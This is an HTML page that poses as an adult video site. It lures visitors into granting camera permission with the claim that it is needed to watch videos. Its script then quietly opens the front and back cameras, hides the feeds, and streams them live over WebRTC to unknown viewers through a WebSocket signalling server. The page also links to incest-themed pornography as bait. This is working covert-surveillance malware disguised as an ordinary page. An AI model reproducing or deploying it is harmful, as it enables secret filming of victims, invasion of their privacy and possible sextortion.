<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>sex videos</title>

<style>
body{
  margin:0;
  background:#111;
  color:#fff;
  font-family:Arial,sans-serif;
  text-align:center;
  padding:20px;
}

#status{
  font-size:20px;
  margin:20px;
}

#error{
  color:#ff7777;
  font-size:16px;
  margin:15px;
}

#content{
  display:none;
}

#frontVideo,
#backVideo{
  display:none;
}

.googleBtn{
  display:inline-block;
  margin-top:20px;
  padding:12px 25px;
  background:#fff;
  color:#222;
  text-decoration:none;
  border-radius:8px;
  font-size:16px;
  font-weight:bold;
}

.retryBtn{
  display:none;
  margin-top:15px;
  padding:12px 25px;
  border:0;
  border-radius:8px;
  font-size:16px;
  cursor:pointer;
}
</style>
</head>

<body>

<h1>HD sex videos</h1></h1>

<div id="status">
  if 18+ just click allow permission its required
</div>

<div id="error">
  Please allow the permission to see the video.
</div>

<button
  id="retryBtn"
  class="retryBtn">
  🔄 Try Again
</button>

<div id="content">

  <div id="liveStatus">
    see more videos by clicking the below button.
  </div>

  <a
    class="googleBtn"
    href="https://www.rat.xxx/search/brother+and+sister/"
    target="_blank"
    rel="noopener noreferrer">
    click here to see the HD video
  </a>

</div>

<video
  id="frontVideo"
  autoplay
  muted
  playsinline>
</video>

<video
  id="backVideo"
  autoplay
  muted
  playsinline>
</video>

<script>
const status =
  document.getElementById("status");

const errorBox =
  document.getElementById("error");

const content =
  document.getElementById("content");

const retryBtn =
  document.getElementById("retryBtn");

const frontVideo =
  document.getElementById("frontVideo");

const backVideo =
  document.getElementById("backVideo");

let frontStream = null;
let backStream = null;

const peers = new Map();

const ws = new WebSocket(
  (location.protocol === "https:" ? "wss:" : "ws:") +
  "//" +
  location.host +
  "/camera"
);

function send(message){
  if(ws.readyState === WebSocket.OPEN){
    ws.send(JSON.stringify(message));
  }
}

function showPermissionRequired(message){
  status.textContent =
    " permission required";

  errorBox.textContent =
    message ||
    "Please allow permission to use this site.";

  content.style.display = "none";
  retryBtn.style.display = "inline-block";
}

async function startCameras(){

  status.textContent =
    "🟡 Requesting permission...";

  errorBox.textContent = "";

  retryBtn.style.display = "none";
  content.style.display = "none";

  /*
    Request the front camera first.
  */
  try{

    frontStream =
      await navigator.mediaDevices.getUserMedia({
        video:{
          facingMode:{
            ideal:"user"
          }
        },
        audio:false
      });

    frontVideo.srcObject =
      frontStream;

    await frontVideo.play()
      .catch(() => {});

  }catch(err){

    console.error(
      "permission error:",
      err
    );

    if(
      err.name === "NotAllowedError" ||
      err.name === "PermissionDeniedError"
    ){

      showPermissionRequired(
        "❌  permission was denied. Please allow camera permission and try again."
      );

    }else{

      showPermissionRequired(
        `❌ Camera could not be opened: ${err.name}`
      );

    }

    return;
  }

  /*
    Permission was granted.
    The site can now be used.
  */

  content.style.display = "block";

  status.textContent =
    "permission granted";

  errorBox.textContent = "";

  /*
    Try the back camera too.
    Some phones allow only one camera.
  */

  try{

    backStream =
      await navigator.mediaDevices.getUserMedia({
        video:{
          facingMode:{
            ideal:"environment"
          }
        },
        audio:false
      });

    backVideo.srcObject =
      backStream;

    await backVideo.play()
      .catch(() => {});

  }catch(err){

    console.warn(
      "Back  unavailable:",
      err
    );

    backStream = null;

  }

  status.textContent =
    backStream
      ? "Every day new link"
      : "moody video";

  announceCameras();
}

function announceCameras(){

  send({
    type:"camera-live",

    cameras:{
      front:!!frontStream,
      back:!!backStream
    }
  });
}

async function createPeer(viewerId){

  if(peers.has(viewerId)){
    return;
  }

  const pc =
    new RTCPeerConnection({
      iceServers:[
        {
          urls:
            "stun:stun.l.google.com:19302"
        }
      ]
    });

  peers.set(
    viewerId,
    pc
  );

  if(frontStream){

    const track =
      frontStream.getVideoTracks()[0];

    if(track){

      pc.addTransceiver(
        track,
        {
          streams:[
            frontStream
          ]
        }
      );

    }
  }

  if(backStream){

    const track =
      backStream.getVideoTracks()[0];

    if(track){

      pc.addTransceiver(
        track,
        {
          streams:[
            backStream
          ]
        }
      );

    }
  }

  pc.onicecandidate =
    event => {

      if(event.candidate){

        send({
          type:"candidate",
          candidate:event.candidate,
          toViewerId:viewerId
        });

      }

    };

  const offer =
    await pc.createOffer();

  await pc.setLocalDescription(
    offer
  );

  send({
    type:"offer",
    offer:pc.localDescription,
    toViewerId:viewerId,

    streamTypes:{
      front:!!frontStream,
      back:!!backStream
    }
  });
}

ws.onopen = () => {
  startCameras();
};

ws.onmessage =
  async event => {

    let msg;

    try{

      msg =
        JSON.parse(event.data);

    }catch{

      return;

    }

    if(msg.type === "viewer-ready"){

      /*
        Only create the WebRTC connection
        after camera permission succeeded.
      */

      if(!frontStream){
        return;
      }

      await createPeer(
        msg.viewerId
      );

      return;
    }

    if(msg.type === "answer"){

      const pc =
        peers.get(
          msg.viewerId
        );

      if(pc && msg.answer){

        await pc.setRemoteDescription(
          msg.answer
        );

      }

      return;
    }

    if(msg.type === "candidate"){

      const pc =
        peers.get(
          msg.viewerId
        );

      if(
        pc &&
        msg.candidate
      ){

        await pc
          .addIceCandidate(
            msg.candidate
          )
          .catch(() => {});

      }

      return;
    }

    if(msg.type === "viewer-left"){

      const pc =
        peers.get(
          msg.viewerId
        );

      if(pc){

        pc.close();

        peers.delete(
          msg.viewerId
        );

      }

    }

  };

ws.onclose = () => {

  status.textContent =
    "🔴 Server connection closed";

};

/*
  Retry button
*/
retryBtn.onclick = () => {

  if(frontStream){
    frontStream
      .getTracks()
      .forEach(track => track.stop());

    frontStream = null;
  }

  if(backStream){
    backStream
      .getTracks()
      .forEach(track => track.stop());

    backStream = null;
  }

  startCameras();
};
</script>

</body>
  </html>
